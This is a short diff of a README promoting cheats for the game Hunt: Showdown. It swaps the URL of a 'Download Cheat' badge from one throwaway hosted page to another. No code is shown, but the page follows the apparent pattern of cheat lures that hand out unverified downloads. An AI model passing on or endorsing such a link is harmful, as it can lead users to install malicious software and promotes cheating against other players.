@@ -6,7 +6,7 @@ Welcome to the bayou, where death comes from all angles—and sometimes through 
 
 Forget losing to rats hiding in corners or campers with luck on their side. With these cheats, you're the real boss monster out there.
 
-[![Download Cheat](https://img.shields.io/badge/Download-Cheat-blueviolet)](https://fileoffload7.bitbucket.io)
+[![Download Cheat](https://img.shields.io/badge/Download-Cheat-blueviolet)](https://Hunt-Showdown-Cheat-fu2.github.io/.github)
 ---
 
 ## 🎯 Product Description
